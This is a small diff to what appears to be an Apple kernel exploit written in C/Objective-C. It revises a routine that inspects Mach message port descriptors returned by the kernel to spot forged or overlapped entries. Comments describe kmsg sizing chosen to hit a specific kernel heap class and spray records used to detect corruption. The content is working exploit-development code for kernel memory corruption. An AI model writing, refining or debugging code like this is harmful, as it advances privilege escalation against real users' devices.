@@ -44,7 +44,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P073_BUILD @"p073-second-table-v7d-desc-scanfix"
+#define P073_BUILD @"p073-second-table-v7e-desc-literal"
 
 /* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
 #define P073_MSG_SIZE     0x7FCu
@@ -353,7 +353,14 @@ static int p073_harvest_portkind(p073_held_t *v, uint32_t *descForgeOut) {
         memcpy(&padw, dp + 4, 4);
         memcpy(&dtype, dp + 8, 2);
         memcpy(&ddisp, dp + 10, 2);
-        BOOL sm = (ddisp != MACH_MSG_TYPE_COPY_SEND) || (dtype != MACH_MSG_PORT_DESCRIPTOR)
+        /* v7e: compare against LITERAL recv values — the rig SDK's
+           MACH_MSG_PORT_DESCRIPTOR / MACH_MSG_TYPE_COPY_SEND constants don't
+           match the kernel's written-back words (v7d flagged every clean
+           {type=0, disp=0x11} desc, contradicting the SDK constants).
+           Clean port desc = {type u16 == 0, disp u16 == 0x11}. A fill record
+           {sid u32, flags u32, tail 0x1000000001} on a desc reads disp u16
+           = 0x0001 != 0x11 -> detectable. */
+        BOOL sm = (ddisp != 0x11u) || (dtype != 0u)
                || (name >= P073_KVA_MIN && name < P073_KVA_MAX);
         if (sm) {
             forge++;
